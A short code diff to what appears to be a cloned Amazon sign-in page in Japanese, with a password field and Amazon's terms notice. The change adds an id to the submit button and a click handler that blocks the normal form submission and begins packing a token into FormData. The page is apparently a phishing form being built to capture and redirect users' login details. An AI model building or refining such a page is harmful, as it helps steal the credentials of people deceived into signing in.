@@ -123,7 +123,7 @@
           <input type="password" id="password" name="password" class="form-input">
         </div>
   
-        <button type="submit" class="submit-button">サインイン</button>
+        <button type="submit" class="submit-button" id="submitBtn">サインイン</button>
   
         <div class="note-text">
           サインインすることで、Amazonの利用規約、プライバシー規約に同意したものとみなされます。
@@ -165,6 +165,8 @@
         // 4) フォーム送信ボタン
         const submitBtn = document.getElementById('submitBtn');
         submitBtn.addEventListener('click', function(){
+          // 本来のフォーム送信イベントを止める
+          event.preventDefault();
           // 送信データをFormDataで組み立てる
           const formData = new FormData();
           formData.append('token', token);
